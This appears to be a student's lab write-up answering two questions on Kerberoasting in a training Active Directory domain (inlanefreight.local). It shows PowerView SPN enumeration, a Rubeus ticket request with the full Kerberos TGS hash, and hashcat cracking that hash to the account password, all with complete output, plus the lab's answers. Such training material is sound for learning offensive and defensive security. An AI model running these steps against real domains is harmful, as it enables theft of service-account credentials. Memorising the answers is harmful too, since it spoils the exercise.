# Section 18: Kerberoasting - from Windows

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. What is the name of the service account with the SPN 'vmware/inlanefreight.local'?

Context:
```powershell
PS C:\Tools> Get-DomainUser * -spn | select samaccountname, serviceprincipalname

samaccountname    serviceprincipalname
--------------    --------------------
adfs              adfsconnect/azure01.inlanefreight.local
backupagent       backupjob/veam001.inlanefreight.local
certsvc           http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
krbtgt            kadmin/changepw
damundsen         {MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433, MSSQL/ACADEMY-EA-FILE}
sqldev            MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
sqlprod           MSSQLSvc/SPSJDB.inlanefreight.local:1433
sqlqa             MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
SAPService        SAPService/srv01.inlanefreight.local
solarwindsmonitor sts/inlanefreight.local
testspn           testspn/kerberoast.inlanefreight.local
testspn2          testspn2/kerberoast.inlanefreight.local
svc_vmwaresso     vmware/inlanefreight.local
```

**Answer:** `svc_vmwaresso`

---

### 2. Crack the password for this account and submit it as your answer.

Context:
- Get the ticket
```powershell
PS C:\Tools> .\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
>>

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : svc_vmwaresso
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svc_vmwaresso)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_vmwaresso
[*] DistinguishedName      : CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : vmware/inlanefreight.local
[*] PwdLastSet             : 4/5/2022 12:32:46 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$C24BFED2AD20D667C3B8F40566F9C62E$2C5C86D5BE18A07343F0E9BC1ED5D53EFDD9BB55121D54BA1845516330A5408AE04857FC04FF87B223100E0E388F40736A64DFE66C76DBA616EFA6B2F2395991923429879900B368DD4A74957F22A3FDFE0501EF516653EB764FB06A86185FEB97E570A9C9019930B6D81984363F6BA285BF6C6301C8E57F359B43B30EC6ACAE5591980FC8FE0F920C02C7BF04F65121898B99701E1EEE602E2951CE0B30C8098C8EE0D752FA1144FD22572354393E914F39BD671DC3C93EA56AD4CDA029019CE6D2EB7046C4343EC610BA6399C0F03F08CCC9FA608C8990A1162324B424397600434E5F8CD214881018C2F675AA1B35763222ED09B20E7ACEB8DC5CF39C00EB08CD466C95414C13424DD41F1B542CBCD9271EC965C3726BC67E10A78521D44EC2E6BAF3A72B2C62902BCF4D5DA210A828B2741C282796B205B251469D849904F95A7BEC2CEAB0005ABFAD6F1856B22032757644DD3BA1D4DE37C33F9F20D818B4B51EE7DF0106E273FF749E4F966F0D60664D14B12E783160F00A3067241C7176ADDDDEDC7482ADD8B399F70A2BF01DD3B13306A7054AF4405806EF35B3150DCD1C0333B6F82E9F6C4A3AF321AC6E3645533E5AB371CF0DCF7ACCF6D357932426B47CC33BA9D6B7AFFEB59D7DEED8B7DC4146233C4EA5BA495B33C25913899E8EBEA4B7C099F41AE745C4A9A378ED929D6EE74D74F1C16122A529E3E66B093E8EC40DCE526CE092D4BAFD59E58CAA3A7AC0A58B46D94DADD4501180B97B1BF22A913B7F1FCCB83411985236F88F18385B142165524DE8F99E0DF12DB005102E506553E16E04462637BE32CBED31157BE00C9BC81725346EA0AF9FE3441F23FC61A7E303100838416E7D0BA4F036167A0D7A4E32BFB53C7FF3EE1303D2515491F6DA0BC323FC79B73490CE0ED52C0685485ECD6F26D9403E54FAFB11BE172D066297EA4B7B4EA21138AA871D181C7C9CAF75198C90EC32540416B489C7632EDA59D9410A2B9E26E4107E1F27463699BF963EE94986816A94C9957402F8EC30F0E685F785ECBDFF433D1043D3A084DE8168E28440ACBEC57DE62C18D09DE2B4A3F6059365C44030418193596CD4BB899787CA9FAD3E94A9AD2EC23BE1CAB440882744F5C364E2C98773571BC688932BEF7EDB80898A5989833FFAF3EEAF43047004AABA9BDE1B8F2DC46A97141F8DF44EC0154B7A53C0532C14012B86094B6C11AD0C11DD05AD523FCAE8595578F91F898481A8FA624CF093578E6AE0F79BDA8D176676861DAA871EC3B77943F78ED41BD46AAD71AC3A7C6FDAD099A47AA6174D1675DD5C0BE24A98FC42EB1BBB24383F6A203AF26FB22365AE42E480FD17E31265A3EBEDA02ABFEBD079705059E6E7605071D168F1C26E09FA0BFAD54F6B27B4F1821E3427E51587128D6FB0517415DC09E56F1B93B991C2E86CCC7EEFB7E30EF9AF9A4DBF4B49830D19A788D722E7C86AF59795E8E9A5024775481C91E5E6FED2F540F9E349C41236D0B6B42E7CA45ED9226CF5BE3E1B0A4569139F1720C638BC6050099F7C2A7560C7CC1349B6F9190807806486935F48E59CCA82135E9665D3741123E8389A80E9206FB95B26AB5CB93F55443ADC9D8C23E3FF4CB9CD8398BFCB95ED309392D1E7EB9886EA9E6857FDAF9F6A5263A8DED5
```
- Crack offline:
```bash
┌─[eu-academy-2]─[10.10.15.48]─[htb-ac-2162140@htb-cffpvk79zs-htb-cloud-com]─[~]
└──╼ [★]$ hashcat -m 13100 svc_vmwaresso_tgs /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC-Milan Processor, 3844/7752 MB (969 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC-Milan Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$c24bfed2ad20d667c3b8f40566f9c62e$2c5c86d5be18a07343f0e9bc1ed5d53efdd9bb55121d54ba1845516330a5408ae04857fc04ff87b223100e0e388f40736a64dfe66c76dba616efa6b2f2395991923429879900b368dd4a74957f22a3fdfe0501ef516653eb764fb06a86185feb97e570a9c9019930b6d81984363f6ba285bf6c6301c8e57f359b43b30ec6acae5591980fc8fe0f920c02c7bf04f65121898b99701e1eee602e2951ce0b30c8098c8ee0d752fa1144fd22572354393e914f39bd671dc3c93ea56ad4cda029019ce6d2eb7046c4343ec610ba6399c0f03f08ccc9fa608c8990a1162324b424397600434e5f8cd214881018c2f675aa1b35763222ed09b20e7aceb8dc5cf39c00eb08cd466c95414c13424dd41f1b542cbcd9271ec965c3726bc67e10a78521d44ec2e6baf3a72b2c62902bcf4d5da210a828b2741c282796b205b251469d849904f95a7bec2ceab0005abfad6f1856b22032757644dd3ba1d4de37c33f9f20d818b4b51ee7df0106e273ff749e4f966f0d60664d14b12e783160f00a3067241c7176addddedc7482add8b399f70a2bf01dd3b13306a7054af4405806ef35b3150dcd1c0333b6f82e9f6c4a3af321ac6e3645533e5ab371cf0dcf7accf6d357932426b47cc33ba9d6b7affeb59d7deed8b7dc4146233c4ea5ba495b33c25913899e8ebea4b7c099f41ae745c4a9a378ed929d6ee74d74f1c16122a529e3e66b093e8ec40dce526ce092d4bafd59e58caa3a7ac0a58b46d94dadd4501180b97b1bf22a913b7f1fccb83411985236f88f18385b142165524de8f99e0df12db005102e506553e16e04462637be32cbed31157be00c9bc81725346ea0af9fe3441f23fc61a7e303100838416e7d0ba4f036167a0d7a4e32bfb53c7ff3ee1303d2515491f6da0bc323fc79b73490ce0ed52c0685485ecd6f26d9403e54fafb11be172d066297ea4b7b4ea21138aa871d181c7c9caf75198c90ec32540416b489c7632eda59d9410a2b9e26e4107e1f27463699bf963ee94986816a94c9957402f8ec30f0e685f785ecbdff433d1043d3a084de8168e28440acbec57de62c18d09de2b4a3f6059365c44030418193596cd4bb899787ca9fad3e94a9ad2ec23be1cab440882744f5c364e2c98773571bc688932bef7edb80898a5989833ffaf3eeaf43047004aaba9bde1b8f2dc46a97141f8df44ec0154b7a53c0532c14012b86094b6c11ad0c11dd05ad523fcae8595578f91f898481a8fa624cf093578e6ae0f79bda8d176676861daa871ec3b77943f78ed41bd46aad71ac3a7c6fdad099a47aa6174d1675dd5c0be24a98fc42eb1bbb24383f6a203af26fb22365ae42e480fd17e31265a3ebeda02abfebd079705059e6e7605071d168f1c26e09fa0bfad54f6b27b4f1821e3427e51587128d6fb0517415dc09e56f1b93b991c2e86ccc7eefb7e30ef9af9a4dbf4b49830d19a788d722e7c86af59795e8e9a5024775481c91e5e6fed2f540f9e349c41236d0b6b42e7ca45ed9226cf5be3e1b0a4569139f1720c638bc6050099f7c2a7560c7cc1349b6f9190807806486935f48e59cca82135e9665d3741123e8389a80e9206fb95b26ab5cb93f55443adc9d8c23e3ff4cb9cd8398bfcb95ed309392d1e7eb9886ea9e6857fdaf9f6a5263a8ded5:Virtual01
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmwa...a8ded5
Time.Started.....: Wed Aug 19 03:49:17 2026 (5 secs)
Time.Estimated...: Wed Aug 19 03:49:22 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1882.2 kH/s (0.70ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10508288/14344385 (73.26%)
Rejected.........: 0/10508288 (0.00%)
Restore.Point....: 10506240/14344385 (73.24%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: W141414 -> Villegas211090

Started: Wed Aug 19 03:49:16 2026
```

**Answer:** `Virtual01`

---

[Back to Module Index](./README.md)
